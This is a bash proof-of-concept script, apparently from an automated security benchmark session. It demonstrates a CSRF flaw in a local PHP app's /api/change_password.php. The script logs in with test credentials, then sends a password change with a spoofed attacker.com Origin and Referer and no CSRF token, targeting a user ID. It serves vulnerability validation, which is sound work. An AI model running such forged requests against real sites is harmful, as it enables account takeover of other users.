#!/bin/bash
# POC: POC demonstrates CSRF vulnerability in /api/change_password.php endpoint. Creates an authenticated session, then sends a password change request from a cross-origin referer without CSRF token to show the endpoint accepts the request without CSRF protection.
# Target: ./repo
# Created: 2025-11-07T17:46:12.216Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# CSRF Attack POC for Password Change Endpoint
# This script demonstrates the CSRF vulnerability in /api/change_password.php
# The endpoint accepts password change requests without CSRF token validation

TARGET_URL="http://localhost:8080"
CSRF_ENDPOINT="${TARGET_URL}/api/change_password.php"
LOGIN_ENDPOINT="${TARGET_URL}/api/login.php"

echo "[*] CSRF Vulnerability POC - Password Change Endpoint"
echo "[*] Target: $CSRF_ENDPOINT"
echo ""

# Step 1: Authenticate to get valid session
echo "[+] Step 1: Authenticating user to establish session..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$LOGIN_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=testuser&password=password123")

SESSION_COOKIE=$(grep 'PHPSESSID' /tmp/cookies.txt | awk '{print $7}')
echo "[+] Obtained session: $SESSION_COOKIE"
echo "[+] Login response: $LOGIN_RESPONSE"
echo ""

# Step 2: Simulate CSRF attack from cross-origin
echo "[+] Step 2: Simulating CSRF attack from attacker.com..."
echo "[+] Sending password change request with cross-origin Referer..."
echo ""

CSRF_ATTACK=$(curl -s -b /tmp/cookies.txt -X POST "$CSRF_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/csrf.html" \
  -d "oldPassword=password123&newPassword=csrf_exploited&confirmPassword=csrf_exploited&userId=108")

echo "[+] Response from CSRF attack:"
echo "$CSRF_ATTACK"
echo ""

# Step 3: Verify if attack succeeded
if echo "$CSRF_ATTACK" | grep -q "success.*true"; then
  echo "[!] VULNERABILITY CONFIRMED: Password change accepted without CSRF token!"
  echo "[!] The endpoint accepted the cross-origin request without validation"
  echo "[!] Impact: Attacker can force password changes via CSRF"
  exit 0
else
  echo "[-] Attack response received but checking for errors..."
  echo "[-] Response: $CSRF_ATTACK"
  
  # Check if it's still successful even with different messages
  if echo "$CSRF_ATTACK" | grep -qi "password changed\|success"; then
    echo "[!] VULNERABILITY CONFIRMED: Password change was processed!"
    exit 0
  else
    echo "[-] Response did not indicate success. Vulnerability may be mitigated or endpoint not accessible."
    exit 1
  fi
fi